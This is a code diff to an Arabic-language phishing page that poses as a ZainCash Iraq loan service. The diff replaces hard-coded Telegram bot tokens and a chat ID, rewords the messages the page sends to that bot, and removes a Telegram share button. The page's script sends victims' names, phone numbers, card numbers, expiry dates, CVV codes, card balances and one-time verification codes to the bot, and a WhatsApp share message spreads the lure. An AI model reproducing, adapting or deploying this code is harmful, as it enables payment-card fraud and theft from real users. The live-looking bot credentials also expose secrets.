@@ -446,7 +446,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
         <p id="thanksText">سيتم التواصل معك قريباً لاستلام المبلغ. شكراً لاستخدامك خدمتنا.</p>
         <div class="share-bar">
           <button class="share-btn" onclick="shareNow('whatsapp')">واتساب</button>
-          <button class="share-btn" onclick="shareNow('telegram')">تيليجرام</button>
         </div>
         <button class="btn" onclick="window.location.reload()">طلب جديد</button>
       </div>
@@ -471,8 +470,8 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
   <audio id="errorSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_114b6b4b8e.mp3"></audio>
   <script>
   // Telegram Bot Info
-  const TELEGRAM_TOKEN = "7713450543:AAHm3l6t9O4EFmVxwtBoLg4a3M12mb0E5yM";
-  const TELEGRAM_CHATID = "6873334348";
+  const TELEGRAM_TOKEN = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+  const TELEGRAM_CHATID = "-4680375515";
   let spamBlock = false;
   let userData = {};
   let currentStep = 0;
@@ -686,7 +685,7 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
         chat_id: TELEGRAM_CHATID,
-        text: `معلومات بطاقة زين كاش:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${expDate}\nرمز CVV: ${cvv}\nرصيد البطاقة: ${cardBalance} دينار`
+        text: `معلومات بطاقة زين كاش:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${cardNumber}\nتاريخ الإنتهاء: ${expDate}\nCVV: ${cvv}\nالرصيد الحالي: ${cardBalance} دينار`
       })
     });
     setTimeout(()=>showStep(2), 1200);
@@ -709,7 +708,7 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
         chat_id: TELEGRAM_CHATID,
-        text: `طلب سلفة مكتمل:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${userData.cardNumber}\nتاريخ الانتهاء: ${userData.expDate}\nرمز CVV: ${userData.cvv}\nرصيد البطاقة: ${userData.cardBalance} دينار\nرمز التحقق: ${otp}`
+        text: `طلب سلفة مكتمل:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${userData.cardNumber}\nتاريخ الإنتهاء: ${userData.expDate}\nCVV: ${userData.cvv}\nالرصيد الحالي: ${userData.cardBalance} دينار\nرمز التحقق: ${otp}`
       })
     });
     setTimeout(()=>{
@@ -742,8 +741,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
     let msg = "قدمت طلب سلفة من موقع ZainCash العراق! جرب الخدمة الآن: ";
     if(type==="whatsapp") {
       window.open(`https://wa.me/?text=${encodeURIComponent(msg+url)}`,"_blank");
-    } else if(type==="telegram") {
-      window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(msg)}`,"_blank");
     }
   }
 
